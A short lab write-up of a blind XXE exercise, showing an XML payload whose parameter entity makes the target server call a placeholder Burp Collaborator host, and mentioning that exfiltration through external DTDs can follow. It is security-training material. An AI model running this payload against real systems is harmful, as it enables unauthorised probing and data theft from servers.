# Lab 04: Blind XXE via XML Parameter Entities

### 🎯 Objective
Identify and exploit a blind XXE vulnerability by triggering an out-of-band (OAST) interaction with Burp Collaborator using **XML Parameter Entities**.

### 🔍 Vulnerability Analysis
The application's XML parser is configured to block standard external entities. However, it fails to restrict **Parameter Entities**, which are specifically used within the Document Type Definition (DTD). This allows an attacker to bypass common security filters.

### 🛠️ Exploitation Steps

1. **The Bypass Technique:**
   Since regular entities like `&xxe;` are filtered, we use a parameter entity defined with the `%` prefix. This entity is declared and invoked entirely within the DTD.

2. **The Payload:**
   Insert the following block between the XML declaration and the root element:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE stockCheck [
     <!ENTITY % xxe SYSTEM "[http://YOUR-COLLABORATOR-ID.oastify.com](http://YOUR-COLLABORATOR-ID.oastify.com)"> 
     %xxe;
   ]>
   <stockCheck>
       <productId>1</productId>
       <storeId>1</storeId>
   </stockCheck>

    Execution:

        Submit the POST request.

        The XML parser processes the DTD, defines the %xxe parameter entity, and immediately executes the external request via %xxe;.

🚩 Result & Verification

    Collaborator Logs: Successfully captured DNS and HTTP interactions from the target server.

    Impact: Confirmed that the server is vulnerable to OOB-XXE, which can be further leveraged to exfiltrate data using external DTDs.

    Status: ✅ Solved
